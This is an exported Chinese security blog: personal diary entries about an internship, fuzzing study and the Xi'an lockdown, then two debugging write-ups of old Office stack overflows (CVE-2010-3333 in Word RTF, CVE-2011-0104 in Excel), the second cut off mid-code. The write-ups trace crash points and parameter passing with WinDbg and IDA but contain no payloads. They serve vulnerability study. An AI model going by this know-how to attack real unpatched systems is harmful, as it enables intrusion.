<p>上班请了两天半的假，主要弄了下纳新宣讲的ppt和复现的漏洞（上回去师大演示的SMBghost）。不上班好像就找到学习的方向了，这两天看了看论文和课题的内容，琢磨了一下hexdump、objdump、xxd，提了个retdec的功能性issue。昨天安全客群里有个师傅问有无翻译人员，加了聊了几句，估计以后偶尔会接点活干。<br>
今天晚上宣讲会，感觉讲的还行emmm，可惜时间有点赶（领导讲话讲多了是这样的），有些点忘了讲（论提纲的重要性），最后的演示也跳过了orz…<br>
最近发现机器学习在科研中应用好多，去开组会一堆textcnn、lstm、孪生神经网络 blablabla，上回在google scholar上搜了一下14年之前的&quot;binary similarity detection&quot;，似乎当时也没啥这方面的研究。<br>
希望早点把现在看的这篇论文搞完（一开始为啥要想着翻译，太蠢了）开始Fuzz方面的学习。</p>
<p>日常羡慕周围一堆Vulcan、玄武的师傅</p>
<p>买了个泰摩栗子C、澳帝焙的半价豆子、滤网，开始玩一玩手冲<br>
主要是觉得挂耳⑧行，以及学累了磨磨豆子还挺放松的应该<br>
没钱买壶×，练习咋用特百惠的水杯倒出稳定的水流√</p>
<p>傻逼坚果云markdown，没保存好让我写了两遍。</p>
<h3 id="2021-10-30">2021-10-30</h3>
<p>昨天通了个大宵，没睡觉（两杯咖啡续命）。本来打算看看计网，结果改去看论文了。看一会儿刷一会儿b站知乎，不过总算是把那篇PATCHECKO看完了，这篇看的时间跨度太大，还得再整理一下。<br>
中午突然困得一比，在实验室睡了俩小时醒来泡了杯咖啡。磨豆子是真的香www。讲真还没仔细尝出酸涩、风味，有空好好琢磨一下，还有包括研磨粗细、水温的影响。</p>
<h3 id="2021-10-03">2021-10-03</h3>
<p>昨天微信提醒银行卡到账，以为是单位发工资了，结果仔细一看发现是安全客给的…（安全客发钱的周期太长导致总能让我感觉是拿了一笔意外之财orz</p>
<p>下午加了同届实习的同事聊了一下最近的工作和“拿到工资了吗”，发现咱俩情况都差不多orzz（可惜人已经保研了qwq）</p>
<p>晚上做了个2000年的考研英语阅读完型，阅读还蛮简单的()，阅读完型各错四个；背了60个单词，~<s>之后每天应该都会这样（跟“网友”互相监督了属于是）</s>~</p>
<p>这两周渗透测试做着做着倒是拿了个弱密码的…最近算是接触了不少弱密码和测评部门建议整改时给出的密码规律，逛了一圈GitHub没发现有啥合适的工具，在考虑啥时候写个字典生成脚本。</p>
<p>果然通宵只有一次和无数次，今晚一定通宵学计网</p>
<p>次日记: 确实通宵学了，然后连续46小时没睡觉</p>
<h3 id="2021-11-05">2021-11-05</h3>
<p>昨天24h+没睡觉去开组会，疯狂揉眼打哈欠2333<br>
从今天开始把每次开例会听到的不认识的词记下来<br>
课题方面虽然每周都没啥进展（实验跑通，其他部分都做完，剩下最后一点了），但是老师觉得明年三月之前肯定能发，问题不大233</p>
<p>今天单位小组开了个周会，内容主要是两个实习生被批一点进展都没有…<br>
今天的划水内容主要是写了个<a href="./31550.html">脚本</a>，用来检测同事给的资产能不能用orz，并分类输出为nessus、awvs等的可用的格式<br>
nessus跑了八九个小时，到晚上才跑完，结果还没看</p>
<p>熬夜成瘾了，今晚又在实验室通宵<br>
收集了一点资产，打算玩玩edusrc（不过每次写在这里的flag都会鸽掉）</p>
<h3 id="2021-11-06">2021-11-06</h3>
<p>给新生出了个键盘流量的简单题，主要参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9hYmF3YXplZWVyLm1lZGl1bS5jb20va2FpemVuLWN0Zi0yMDE4LXJldmVyc2UtZW5naW5lZXItdXNiLWtleXN0cm9rLWZyb20tcGNhcC1maWxlLTI0MTIzNTE2NzlmNA==">https://abawazeeer.medium.com/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuMTM2LmxhL2ppbmdwaW4vc2hvdy0yMTE5NDkuaHRtbA==">https://www.136.la/jingpin/show-211949.html<i class="fa fa-external-link-alt"></i></span></p>
<p>改了一下昨天的脚本，把target放到命令行了<br>
晚上本来想跑个脚本，然后把结果放到工具里扫一晚上，然后发现脚本没有去重，结果里有好多重复的，就用了一下pandas，在实验室整到十二点多。</p>
<p>今晚雪下的蛮大，跟熬夜看EDG比赛的学弟们吃了点烧烤</p>
<p>作为上周因为马服捆绑wegame而把LOL卸载掉（当时还能通过改init文件直接进客户端但是万一以后完全堵上了呢orz）、主播只看大司马，偶尔C皇王纪超啥的、基本不看比赛的（半）路人来说，S11总决赛的观众确实很…诡异，（不过估计在普通高校里我邮也算正常了）。<br>
做出破坏秩序和公序良俗的不应该道歉然后立正挨打吗orz</p>
<h3 id="2021-11-14">2021-11-14</h3>
<p>23:45：回到宿舍趴床上想记点啥。坚果云markdown是什么垃圾，k480打个字卡半天，该考虑安卓平板上有啥好用的markdown编辑器了。明天再写吧</p>
<p>翌日：<br>
一周多没记了，感觉上周还是挺忙的。<br>
周内基本上在上班，实习那有个任务，每天汇报，周五短会，然后自己又太菜只能边学边弄点小产出，导致压力略大，然后（可能是因为通宵了一天半导致情绪不好）申请了一周break<br>
这周可能是通宵上瘾了，周内通宵一天半，周末通宵一天，最高纪录50小时不睡觉达成√<br>
通宵能做的事还蛮多的其实，深夜效率也不低，可能缺点就是白天的时候精神不好容易注意力不集中、眼睛酸、由于一直坐着所以肌肉和关节不太舒服，不过差不多都能通过咖啡/茶、眼药水或热毛巾、躺着伸懒腰解决</p>
<p>周末通宵一晚把安全客的一篇半文章写完、把课题用的数据提取出来，还看了几集美剧2333</p>
<p>这周写了四个脚本，python真好用，shell真难看</p>
<p>关于实习。其实感觉最近好像没有学到啥（）的知识（compare to 之前学习二进制），而且占用了80%醒着的时间，一周的break要是能“把20份考研英语卷子写完 + 跟着做一遍<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjU5NTguaHRt">使用winafl对迅雷的torrent解析逻辑进行fuzz<i class="fa fa-external-link-alt"></i></span>”可能真该考虑我到底要不要run了</p>
<p>奇妙的一周，有最长的通宵记录和最早睡的记录<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211115220939.png" alt="20211115220939"></p>
<h3 id="2021-11-16">2021-11-16</h3>
<p>昨天改了一下课题用的脚本，跑了点数据给师兄做测试（不过也发现了几个之前没有考虑到的问题，打算组会再问问老师）</p>
<p>因为晚上跟学长吃火锅吃得一身味道，通宵了。做做英语，再看点计网（如果可以）</p>
<p>昨天才知道原来考研英语没有听力orz</p>
<h3 id="2021-11-19">2021-11-19</h3>
<p>周五了，做个总结吧。<br>
自然是没有达成“20份卷子+winafl”的，卷子做了8份不到，看雪那个winafl就没打开过。虽然这周还没结束，但是明天高中同学来玩，周末应该也没啥时间学习了，希望有空的话能把winafl弄一弄吧。<br>
关于英语卷子效率低下的问题，因为其中几份错的实在太多（阅读差不多能错十个orz，虽然好的时候能错三四个）周二的时候通了个宵，好好整理了一晚上。感觉这种看文章半脸蒙的状态有点像高二写四级…<br>
这周在课上看了半篇模糊测试综述论文（<span class="exturl" data-url="aHR0cHM6Ly9jcmFkLmljdC5hYy5jbi9DTi8xMC43NTQ0L2lzc24xMDAwLTEyMzkuMjAyMS4yMDIwMTAxOA==">任泽众等:模糊测试技术综述<i class="fa fa-external-link-alt"></i></span>），略有收获。<br>
课题组这周依旧没有开会，本来打算周四周五问一下导师几个问题，也给忘了orz<br>
一周看了五部电影（暮光之城），疯狂快进看的，只能说很狗血了<br>
晚上在麦当劳遇到了个可爱的女生，可惜满脑子都是吃的没考虑咋要微信，头一回在表白墙上海底捞，估计也捞不到了…<br>
联系<a href="#2021-08-27">三个月前的日记</a>，以后不管在哪遇到心动的女孩子、不管她边上有几个闺蜜都得去要联系方式!!!（虽然我好像说过近期不找对象？）<br>
最近不知道为啥真的不喜欢和人打交道、不喜欢社交（比如高中同学邀一起玩、我妈让我把表妹约出来吃饭blablabla）<br>
It would be much easier if wearing a mask…</p>
<p>坚果云markdown这傻逼软件逻辑是真的有问题</p>
<h3 id="2021-12-01">2021-12-01</h3>
<p>我咋觉得记的小作文被坚果云吞了…明明感觉上次写日记不是在19号，工资的事情也早记过了，orz</p>
<p>最近发生了蛮多有意思事的，收到人生第一笔工资（11.08）、买了第一个大于100块&amp;头戴式耳机（AKG 371bt）、前后买了三个垂直鼠标（上班上得拇短展肌和拇短屈肌酸…本来想买轨迹球的但是肯辛顿也太贵了orz），然后一个太大一个太小，所以退了两个，京东无理由真香，以及虽然贵了点但还是没选择支持淘宝、在某网友的邀请下（11.27 28）一行人去周边的石泉县玩了两天，这个月第二次出长安区了属于是，小县城活得好悠闲qwq。</p>
<p>这段时间嗯，课题稳步进展，最近在看LLVM IR，之后开始进一步处理生成的中间代码；英语…学了，但是雅思已经放在#n了；pwn/web，没咋学了（躺），感觉像是个懒狗，估计短期内也不会咋学了，还是先想想期末考和考研吧orzzzzzz（不过上回把winafl的环境搭好了，十二月的话还是希望能把看雪上那个fuzz流程搞一遍，印证一下综述里的一些东西）</p>
<p>前几天看了个b站的视频：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMWNTNHkxUjdSMQ==">探究《尚气》里的中文对白为何如此蹩脚，再一一改正，寻本溯源<i class="fa fa-external-link-alt"></i></span>，大概是关于汉语西化的现象，仔细一想其实大部分年轻人（包括本人）在口头和书面表达中都或多或少有些…Enginese？包括前段时间的论文翻译也是。还是要及时纠正啊…</p>
<p>十二月啊，2021年马上又要过了…</p>
<h3 id="2021-12-04">2021-12-04</h3>
<p>因为晚上通宵了，所以这其实是12.05早上六点记录的（为什么是六点呢，因为对面实验室有个逆天学弟六点的闹钟响了五六次，我和另一个学弟醒了他都没醒）</p>
<p>因为玩迅雷torrent_fuzz所以写了个爬虫做语料库（真的是很喜欢写爬虫啊orz</p>
<h3 id="2021-12-08">2021-12-08</h3>
<p>这几天没啥想记的（自闭），实习那边明天开始也请了一周假，因为要考六级了而我爸妈一直烦着说要认真备考（外加上回写了半份卷子过程不是很顺，虽然可能是由于真的太困了）。讲真整天请假真蛮不好意思的…</p>
<p>前天安全客把我水的一篇文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjYwNDcx">Fr3v1带你读论文-Hybrid Firmware Analysis for Known Mobile and IoT Security Vulnerabilities<i class="fa fa-external-link-alt"></i></span>（真·水）也放上去了，仔细想想还略不好意思的</p>
<p>最近把那篇模糊测试的综述的论文读完了，这种review的东西…还蛮能提升视野的，接下来真要找个时间把看雪上收藏的一些文章操作一遍了</p>
<h3 id="2021-12-10">2021-12-10</h3>
<p>虽然没啥心思但是还是打算耐着性子写完。<br>
昨天下午翘课线上旁听了厦大吴荣鑫教授面向复旦软件工程实验室（se）做的报告，大概是关于基于源代码的静态漏洞检测和对crash样本的处理，se那边应该不是做静态漏洞检测的，所以一开始还是讲的比较通俗，就是有些研究常用（算是well-knowned 的 truth 了？）的英语名词没get到，导致有些地方没理解，算是个小遗憾了。<br>
最近发现静态分析这个方向和“我一直觉得开着纯粹是离散课”的编译原理关系密切，之前收藏了安全客上的<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3N1YmplY3QvaWQvMjUxNDI4">数学魔法——你所不了解的程序分析<i class="fa fa-external-link-alt"></i></span>，不过感觉这种东西还是得上个课才能比较好理解，打算在近几个月内（大概放假）把南大的程序分析课听完<a href="%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B%E8%AF%BE%E7%A8%8B01%EF%BC%88Introduction%EF%BC%89">https://www.bilibili.com/video/av91858985</a></p>
<p>最近不知道为啥挺烦躁，晚上跟爸妈打了个电话，心情不好然后应该是头一回直接挂电话…回宿舍路上走到半路了又回到实验室orz。通宵写了点英语，弄了一下“winafl fuzz 迅雷解析torrent”的玩意，结果报了一晚上各种逆天问题（指全网都没有人提过的问题），更烦了，草</p>
<p>印象里前段时间一直有个设想，周末在星巴克（或者别的地方）买杯咖啡买个蛋糕，一整天啥都不干，就看着窗外的人走来走去</p>
<p>啊对了，昨天（前天）还出了个log4j rce，放两张图吧</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211211085214.png" alt="20211211085214"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/HVAXC%5D4271XVHU4BOH3KG%5DP.jpg" alt="HVAXC]4271XVHU4BOH3KG]P"></p>
<p>(11号清晨)</p>
<h3 id="2021-12-11">2021-12-11</h3>
<p>陪人通宵一晚<br>
连通两天，真好。昨天十点睡三点醒；今天七点睡两点醒。真有我的<br>
本学期洗澡通宵定律：洗完澡必通宵</p>
<h3 id="2021-12-16">2021-12-16</h3>
<p>看了一周英语，再过一天半就结束了:D</p>
<p>下午蹭了个信工所孟国柱老师给复旦（应该还是上回那个实验室）的报告，关于人工智能在安全方面的应用和探索，包括移动安全、恶意代码和GAN，蛮有意思的。不过时间上和组会（因为疫情所以线上了）有点冲突，双线程听会议并不是很成功（脑子炸了）。搜了一下，孟老师是国重的…%%%</p>
<p>记录一下最近在想的一（两）个…可能偏向传播学的问题：how to define majority and minority group on the Internet (when it involves region as a variable), and why the “minority” has such influences.</p>
<h3 id="2021-12-19">2021-12-19</h3>
<p>昨天考了个六级，本来以为运气一般的话530上下，现在估计勉强飘过了。除了仔细阅读和选词之外没一个写得正常的：作文差点没写完，听力犯困，匹配题两个没找到，翻译只会CPC。不过确实好久没有“认真考试”的感觉了，六级要是真的低分飘过，估计还真得去考个多邻国（便宜方便）或者雅思，不然500-的分数也太拉了，顺便也找回些应对考试的感觉。</p>
<p>通宵然后早晨七点多去洗澡，之后回宿舍睡觉，睡到下午四点半orz，醒来感觉感冒好像重了一些。</p>
<p>咋还不线上上课或者提前放假啊</p>
<p>疫情+出血热，哈哈…<br>
前几天在b站上看到附近某栋宿舍里住了鼠鼠，真牛逼。</p>
<h3 id="2021-12-21">2021-12-21</h3>
<blockquote>
<p>“擦，封校+网课了真刺激，__________”<br>
好久没有写日报了，今天好想说些啥</p>
</blockquote>
<p>反正本来对这个地方也没多少好感，就稍稍吐点槽吧，想到啥说啥，画横线的地方请进行开方式理解</p>
<p>这两天过的跟周末/放假似的。<br>
昨天晚上学校突然通知上网课，本市学生回家，外省学生一会儿能走一会儿不能的（然后第二天有老师说学校没有通知能回家，并要对这些不实消息传播者进行______。😅😅😅<br>
反正就，直接打破了本来的风平浪静（或许是学校把学生“保护”得太好了，学校里之前看起来一点事没有😅）。嗯…原来学校外边这么严重…目前毒圈是越来越近了</p>
<p>然后又是出现了例如“发誓做了核酸”、“一码通挂了”等问题，前者虽然大多以段子形式传播，但认真审视的话…也太危险和不负责任了；对于一码通加载不出来，我一开始还以为是被打了（个人认为如果进行攻击的话18-20号确实非常合适），结果好像并不是这样的，只能说这个用户量千万级的产品确实彳亍，牛逼(๑•̀ㅂ•́)و✧。</p>
<p>辛亏👴不是今年考研，不然直接破防开摆了，日，什么玩意儿啊，真__牛逼</p>
<p><strong>人（部分）真的有被黑心理啊。做错就得认，挨打就得立正，结果反倒像是全网故意地域黑似的orz（不过也不排除挑起地域矛盾的人反串了，套娃）。反正比起暑假在厦门的那回疫情，政府应对方式____了，起码其中一个地方可以及时划（足够大的）区域进行封闭管理，也不用在核酸检测或隔离时耗费大量时间和造成不必要的矛盾，其中一个地方的人民可以及时停工，也不用看到zf朝令夕改或者相互推诿，…</strong>___。</p>
<p>话说回来，为啥大多hemorrhagic fever都集中在西安附近呢？不说福建的某医生只在书上见过这种fever，连榆林的同学在上大学前都没听过这个词…</p>
<p>对于希望上网课和线上考试所以看到确诊人数增长就欢呼的fds表是不是很理解，思想多单一啊</p>
<p>不过还是要说：防疫工作者辛苦了！！！</p>
<p>似乎感受到了去年年初的武汉，不出意外的话，👴可能要在西安过年了。草，草，草</p>
<h3 id="2021-12-23">2021-12-23</h3>
<p>没啥说的，反正就在宿舍呆着，每天做核酸、三餐被送饭呗，没想到我还能有嫖学校的一天<br>
昨天学校上了热搜#4…行，不过确实学校在短暂慌乱后安排得还是蛮合理的</p>
<p>昨天晚上老师给师兄和我在线上开了个小会，理了一下课题后续思路，然后我终于可以把llvm ir的ppt讲了2333，也算是少了个事情。讲的过程还行，就是ppt有些内容多余了<br>
这两天虽然盘算着要做些事或者看书，但基本也没咋去实现，每天睡到十二点，美好的一天就过去了<br>
甚至实习也没咋去搞…白嫖工资了（打算明天+周末把要交的东西写了）</p>
<p>感觉只有只身在外才能真实体会到身处疫区的感觉，跟之前在家里隔离完全不同2333也能再次在心里坚定信任并佩服国家关于严控疫情的政策，反正我确实在刚开始幻想过为啥国家不躺平呢…<br>
西安的防疫工作者以及受到牵连的工作人员（指例如被迫呆在学校里的后勤等）真的好惨…</p>
<p>最近还想写点对于安全行业的粗浅认识，不过害怕过于幼稚或者得罪人啊orz</p>
<h3 id="2021-12-28">2021-12-28</h3>
<p>原来我可以在1 2°C 的时候用自来水洗澡…</p>
<p>这两天每天晚上弄winafl，目前是在run_target()里result的返回值那部分报错。其实上周本来跑通了，后来手欠把编译出的东西删了…（注：lighthouse和drcov version 2/3）。鉴于在宿舍没有显示器，极大影响效率，所以这几天应该都不会弄这个了。唉。</p>
<p>就西安最近的情况来说，2021过完咋就到2020了呢？</p>
<h3 id="2022-01-01">2022-01-01</h3>
<p>写了个年度总结，虽然后来想起来有些内容没写上，但也差不多了，懒得改了</p>
<p>晚上看了个卫健委的新冠防控方案（第八版）</p>
<p>顺便放一张无关的图：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20220101231026.png" alt="20220101231026"></p>
<h3 id="2022-01-08">2022-01-08</h3>
<p>这几天啥都没学，两三点睡十一二点起床，就看看剧、刷知乎刷微博、打游戏<br>
唯一沾边的是对复习数学的计划大概有了个雏形</p>
<p>讲真FZ130对生产力的提升可不止一倍。<br>
👴什么时候能离开宿舍啊Orz</p>
<p>前几天当了半天志愿者，咋说呢…只穿了身N手-残破的防护服</p>
<p>原来今天才8号，为啥我们宿舍已经经历了（两次）隔离和解除隔离呢</p>
<p>这几天和王师傅聊天，让我对陕西…大跌眼镜，其中最普通的一个是，西安这好的医院和学校都是私立的…<br>
东区太惨了，连在厕所里洗澡都洗不了</p>
<p>立个flag，微信步数0</p>
<h3 id="2021-01-11">2021-01-11</h3>
<p>快要习惯在厕所里洗十度以下的冷水澡了</p>
<p>👴感觉自己好像回不了家了<br>
能不能不在宿舍过年啊，让👴去实验室卷也好啊草</p>
<p>连续两天在晚饭里吃到头发了，不过还能不吃咋的？</p>
<p>疫情以来养成了刷微博的习惯，讲真这厕所戾气太重了</p>
<p>话说为啥只能靠人工统计上报才能知道管辖范围内谁做没做核酸呢</p>
]]></content>
      <tags>
        <tag>莫名其妙的记录</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2010-3333</title>
    <url>/47243.html</url>
    <content><![CDATA[<p>本来打算只看看书，跳过调试的环节，结果在下一章堆漏洞讲到了分析这个漏洞时用到的栈回溯，所以又回来了2333</p>
<span id="more"></span>
<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
</tr>
<tr>
<td>调试器</td>
<td>windbg 6.12</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>word 2003 (11.5604.5606)</td>
</tr>
</tbody>
</table>
<p>注：虽然漏洞好像在XP SP3上都有，但是metasploit生成的crash样本在高于11.5604的word上不一定能用（之前调试CVE-2011-0104用的那个office就8行，直接成功把样本打开了…）这个版本找了好久orzz</p>
<h1>漏洞描述</h1>
<p>Stack-based buffer overflow in Microsoft Office XP SP3, Office 2003 SP3, Office 2007 SP2, Office 2010, Office 2004 and 2008 for Mac, Office for Mac 2011, and Open XML File Format Converter for Mac allows remote attackers to execute arbitrary code via crafted RTF data, aka “RTF Stack Buffer Overflow Vulnerability.”</p>
<h1>复现过程</h1>
<p>用metasploit生成poc。<br>
感觉metasploit在windows上不太好使，后来想起来kali自带了这个…</p>
<p>获得poc后打开word，windbg attach，加载poc触发异常一条龙</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512215446.png" alt="20210512215446"><br>
windbg查看寄存器信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这一步需要符号文件，没有配置过的话可以参考下面两个链接</span><br><span class="line">https://bbs.pediy.com/thread-251052.htm</span><br><span class="line">https://www.cnblogs.com/csnd/p/11800535.html</span><br></pre></td></tr></table></figure>
<p>发现edi指向了一个只读的区域<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512215515.png" alt="20210512215515"><br>
所以应该还是在循环复制的时候没有检查长度（似乎好多古老的栈溢出都是因为这个）</p>
<p>在异常处下断点，bp 30e9eb88，重新加载<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512220932.png" alt="20210512220932"><br>
命令k查看栈回溯<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210512222342.png" alt="20210512222342"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windbg查看反汇编代码指令：</span><br><span class="line">u .  // 反汇编当前eip寄存器地址的后8条指令</span><br><span class="line"></span><br><span class="line">u $eip  // 反汇编当前eip寄存器地址的后8条指令</span><br><span class="line"></span><br><span class="line">ub .  // 反汇编当前ip寄存器地址的前8条指令</span><br><span class="line"></span><br><span class="line">ub $eip  // 反汇编当前eip寄存器地址的前8条指令</span><br><span class="line"></span><br><span class="line">u main+0x29 L30 // 反汇编main+0x29地址的后30条指令</span><br><span class="line"></span><br><span class="line">u  // 反编译下8条指令</span><br><span class="line"></span><br><span class="line">uf CTest::add  // 反汇编CTest类的add函数</span><br><span class="line"></span><br><span class="line">uf /c main  // 反汇编main函数，通过/c可以查看main函数中的函数调用(call)都有哪些</span><br><span class="line"></span><br><span class="line">ub 000c135d L20  // 查看地址为000c135d指令前的20条指令内容</span><br></pre></td></tr></table></figure>
<p>查看后续的指令和栈中的内容。连着两个pop然后ret，返回到调用漏洞代码的指令的下一指令，即0x30f4cc96<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513182456.png" alt="20210513182456"></p>
<p>在ida里查看，可以发现该指令位于函数sub_30F4CC5D<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513184917.png" alt="20210513184917"><br>
并且函数有三个参数。因为是32位程序，使用栈传递参数，涉及到的三个push指令分别与[ebp+arg_4]（在后续的子函数中赋给edi，如下图2）、ecx、esi有关<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513200611.png" alt="20210513200611"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513210636.png" alt="20210513210636"></p>
<p>先记录一下，这条call指令位于sub_20F4CC5D的30F4CC93，调用了sub_30E9EB62的30E9EB88（即溢出点）<br>
而我们要回溯它用到的三个参数。第一个很直白；2、3需要再分析</p>
<p>先看esi，esi=[eax+64h]，注意到有一个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:30F4CC75                 call    sub_30D2810C</span><br></pre></td></tr></table></figure>
<p>进入看到这里是最后修改eax的位置<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513211641.png" alt="20210513211641"></p>
<p>再看ecx，在sub_30E9EB62中：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513212959.png" alt="20210513212959"></p>
<p>在30F4CDB0中可以看到，eax=[ebp+arg_0]</p>
<p>综上得到：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210513213522.png" alt="20210513213522"></p>
<p>在windbg中再次调试可以验证静态分析得到的传参过程，没截图，略</p>
<pre><code>整体思路：由崩溃点确定漏洞触发位置——&gt;回溯调用栈——&gt;分析参数如何计算及传递。
</code></pre>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2h4ZnFnOS9iaW4vaHp5eHZr">https://www.yuque.com/hxfqg9/bin/hzyxvk<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNjM5OTguaHRt">https://bbs.pediy.com/thread-263998.htm<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>Win漏洞分析</tag>
        <tag>漏洞战争</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2011-0104 漏洞分析</title>
    <url>/3418.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>项目</th>
<th>版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>WindowsXP SP3</td>
</tr>
<tr>
<td>调试器</td>
<td>windbg 6.12、OD 1.10</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>Office Excel 2003 SP3</td>
</tr>
<tr>
<td>反编译器</td>
<td>IDA 6.1</td>
</tr>
</tbody>
</table>
<p>注：随书文件中的excel在干净的系统中直接打开会显示“操作系统当前的配置不能运行此程序”，需要先安装一个Office</p>
<span id="more"></span>
<h2 id="复现过程">复现过程</h2>
<p>打开Windbg，加载excel，再打开exploit文档</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425182432.png" alt="20210425182432"></p>
<p>此时Windgb会捕捉到发生在excel.exe中异常，ds:eax指向了一个无效的地址。用kb查看一下栈中的数据，可以看到栈内的数据都被覆盖了。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425184839.png" alt="20210425184839"></p>
<p>同时，用ida可以知道异常处所在的函数为sub_300E05AD</p>
<p>用od打开新的excel程序，并在函数入口和异常处下断点，然后加载exploit文件</p>
<p>当程序在函数入口暂停的时候，程序进入了一个新函数，对这个函数的栈顶设置内存写入断点后运行，就可以定位到导致栈溢出的代码</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425191231.png" alt="20210425191231"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：书中写到，exploit是对excel 2007 sp2 写的，因此覆盖到栈顶的是shellcode而不是跳板（所以可以考虑用该版本的excel调试？2333）。嗯 就继续按照书里的来吧</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在ida查看此处的汇编代码，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">.text:300DE825                 lea     esi, dword_3088EC40[edx]</span><br><span class="line">.text:300DE82B                 mov     ecx, eax        ; ecx=eax=复制的字节数</span><br><span class="line">.text:300DE82D                 mov     edx, ecx</span><br><span class="line">.text:300DE82F                 shr     ecx, 2          ; 以dword位单位进行复制，所以/4</span><br><span class="line">.text:300DE832                 mov     edi, ebp</span><br><span class="line">.text:300DE834                 rep movsd               ; 溢出点</span><br></pre></td></tr></table></figure>
<p>接着找到该段代码所属的函数，并用OD在函数起始处下断点，重新运行程序</p>
<p>运行+一点点分析，可以发现这个函数调用了两次（至少），而溢出发生在第二次<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425220650.png" alt="20210425220650"></p>
<p>总共复制了0x300个字节，0x300即“污点”</p>
<p>通过查看调用栈或ida的交叉引用，定位到调用vulfun的函数</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210425221948.png" alt="20210425221948"></p>
<p>查看vul_func反汇编代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __userpurge VulFun&lt;eax&gt;(<span class="keyword">void</span> *a1&lt;ebp&gt;, <span class="keyword">void</span> *a2, <span class="keyword">signed</span> <span class="keyword">int</span> a3, <span class="keyword">unsigned</span> <span class="keyword">int</span> a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// edx@3</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax@5</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax@8</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v9; <span class="comment">// eax@12</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &gt; a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_300DD5A6(dword_3088DF34, <span class="number">6</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = dword_30892C44;</span><br><span class="line">    v6 = *(_DWORD *)&amp;NumberOfBytesWritten;</span><br><span class="line">    a1 = a2;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt;= v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        v9 = v4;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; <span class="number">16384</span> )</span><br><span class="line">LABEL_15:</span><br><span class="line">          v9 = <span class="number">16384</span>;</span><br><span class="line">        sub_3011A989(v9);</span><br><span class="line">        v5 = dword_30892C44;</span><br><span class="line">        v6 = *(_DWORD 